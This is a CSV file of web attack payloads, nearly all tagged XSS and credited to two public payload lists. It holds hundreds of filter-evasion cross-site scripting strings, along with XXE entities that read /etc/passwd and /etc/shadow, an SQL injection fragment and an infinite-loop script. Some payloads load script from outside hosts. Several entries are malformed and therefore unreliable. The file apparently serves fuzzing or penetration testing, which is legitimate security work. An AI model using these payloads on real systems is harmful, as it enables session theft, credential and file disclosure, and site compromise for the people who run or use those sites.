cve,tag,payload,url
,XSS,"<;A HREF="";http://www.gohttp://www.google.com/ogle.com/"";>;XSS<;/A>;",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,""";>;<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert("";XSS"";)>;",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,<;/script>;<;script>;alert(1)<;/script>;,https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,<;/br style=a:expression(alert())>;,https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,<;scrscriptipt>;alert(1)<;/scrscriptipt>;,https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<;br size=\"";&;{alert(&#039;XSS&#039;)}\"";>;",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"perl -e &#039;print \"";<;IMG SRC=java\0script:alert(\"";XSS\"";)>;\"";;&#039; >; out",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"perl -e &#039;print \"";<;SCR\0IPT>;alert(\"";XSS\"";)<;/SCR\0IPT>;\"";;&#039; >; out",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,">""><script>alert(""XSS"")</script>&",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"""><STYLE>@import""javascript:alert('XSS')"";</STYLE>",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,">""'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)>",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,>%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>,https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e',https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,""">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,">""",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,<IMG SRC=JaVaScRiPt:alert(&quot;XSS<WBR>&quot;)>,https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,<IMGSRC=&#106;&#97;&#118;&#97;&<WBR>#115;&#99;&#114;&#105;&#112;&<WBR>#116;&#58;&#97;&#108;&#101;&<WBR>#114;&#116;&#40;&#39;&#88;&#83<WBR>;&#83;&#39;&#41>,https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,<IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&#0000115&<WBR>#0000099&#0000114&#0000105&<WBR>#0000112&#0000116&#0000058&<WBR>#0000097&#0000108&#0000101&<WBR>#0000114&#0000116&#0000040&<WBR>#0000039&#0000088&#0000083&<WBR>#0000083&#0000039&#0000041>,https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,<IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74&#x28&<WBR>#x27&#x58&#x53&#x53&#x27&#x29>,https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=""jav&#x0A;ascript:alert(<WBR>'XSS');"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=""jav&#x0D;ascript:alert(<WBR>'XSS');"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,<![CDATA[<script>var n=0;while(true){n++;}</script>]]>,https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('gotcha');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[' or 1=1 or ''=']]></foof>",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file://c:/boot.ini"">]><foo>&xee;</foo>",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><foo>&xee;</foo>",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:///etc/shadow"">]><foo>&xee;</foo>",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:///dev/random"">]><foo>&xee;</foo>",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,<script>alert('XSS')</script>,https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,%3cscript%3ealert('XSS')%3c/script%3e,https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,%22%3e%3cscript%3ealert('XSS')%3c/script%3e,https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,<img src=xss onerror=alert(1)>,https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,%253cscript%253ealert(1)%253c/script%253e,https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"""><s""%2b""cript>alert(document.cookie)</script>",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,foo<script>alert(1)</script>,https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,<scr<script>ipt>alert(1)</scr</script>ipt>,https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,";alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,<marquee onstart='javascript:alert('1');'>=(◕_◕)=,https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<iframe src=""http://ha.ckers.org/scriptlet.html""></iframe>",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<img%20src="""""">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ckers.org/scriptlet.html""></OBJECT>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""'`><\x00img src=xxx:x onerror=javascript:alert(1)>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""'`>ABC<div style=""font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';"">DEF",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""'`>ABC<div style=""font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';"">DEF",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""-eval(""window['pro'%2B'mpt'](8)"")-""",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""-prompt(8)-""",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,";1lblah""<iframe/onload=confirm(document.domain);></i>""",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""/><img/onerror=\x09javascript:alert(1)\x09src=xxx:x />",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x />",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""/><img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x />",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""/><img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x />",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""/><img/onerror=\x20javascript:alert(1)\x20src=xxx:x />",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""/><img/onerror=\x22javascript:alert(1)\x22src=xxx:x />",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""/><img/onerror=\x27javascript:alert(1)\x27src=xxx:x />",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,""";a=prompt,a()//",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""><iframe%20src=""http://google.com""%%203E",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""><img src=1 onerror=alert(1)>.gif",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""><img src=x onerror=prompt(1);>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""><img src=x onerror=window.open('https://www.google.com/');>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""><script src=//brutelogic.com.br&sol;1.js&num;",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""><script src=data:&comma;alert(1)//",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""><svg onload=alert(1)//",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>-javascript:alert(1)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>-javascript:alert(518)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\x00javascript:alert(1)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\x00javascript:alert(511)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\x09javascript:alert(1)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\x09javascript:alert(507)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\x0Ajavascript:alert(1)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\x0Ajavascript:alert(519)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\x0Bjavascript:alert(1)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\x0Bjavascript:alert(535)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\x0Cjavascript:alert(1)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\x0Cjavascript:alert(515)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\x0Djavascript:alert(1)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\x20javascript:alert(1)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\x20javascript:alert(536)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\x21javascript:alert(1)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\x2531javascript:alert(531)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\x2Bjavascript:alert(1)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\x2Bjavascript:alert(516)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\x3Bjavascript:alert(1)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\x7Ejavascript:alert(1)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\x7Ejavascript:alert(521)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xC2\x85javascript:alert(1)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xC2\x85javascript:alert(525)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xC2\xA0javascript:alert(1)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xC2\xA0javascript:alert(537)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xE1\x9A\x80javascript:alert(1)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xE1\xA0\x8Ejavascript:alert(1)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xE2\x80\x80javascript:alert(1)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xE2\x80\x80javascript:alert(530)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xE2\x80\x81javascript:alert(1)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xE2\x80\x82javascript:alert(1)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xE2\x80\x82javascript:alert(532)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xE2\x80\x83javascript:alert(1)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xE2\x80\x83javascript:alert(527)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xE2\x80\x84javascript:alert(1)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xE2\x80\x85javascript:alert(1)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xE2\x80\x85javascript:alert(509)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xE2\x80\x86javascript:alert(1)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xE2\x80\x86javascript:alert(533)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xE2\x80\x87javascript:alert(1)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xE2\x80\x87javascript:alert(522)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xE2\x80\x88javascript:alert(1)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xE2\x80\x88javascript:alert(510)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xE2\x80\x89javascript:alert(1)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xE2\x80\x89javascript:alert(508)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xE2\x80\x8Ajavascript:alert(1)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xE2\x80\x8Ajavascript:alert(513)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xE2\x80\x8Bjavascript:alert(1)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xE2\x80\x8Bjavascript:alert(528)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xE2\x80\xA8javascript:alert(1)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xE2\x80\xA8javascript:alert(512)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xE2\x80\xA9javascript:alert(1)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xE2\x80\xA9javascript:alert(524)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xE2\x80\xAFjavascript:alert(1)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xE2\x80\xAFjavascript:alert(520)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xE2\x81\x9Fjavascript:alert(1)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xE2\x8523\x9Fjavascript:alert(523)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xE3\x80\x80javascript:alert(1)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xE514\x9A\x80javascript:alert(514)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xE534\xA0\x8Ejavascript:alert(534)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xEF\xBF\xAEjavascript:alert(1)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xEF\xBF\xAEjavascript:alert(526)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xEF\xBF\xBEjavascript:alert(1)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xEF\xBF\xBEjavascript:alert(529)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"""`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
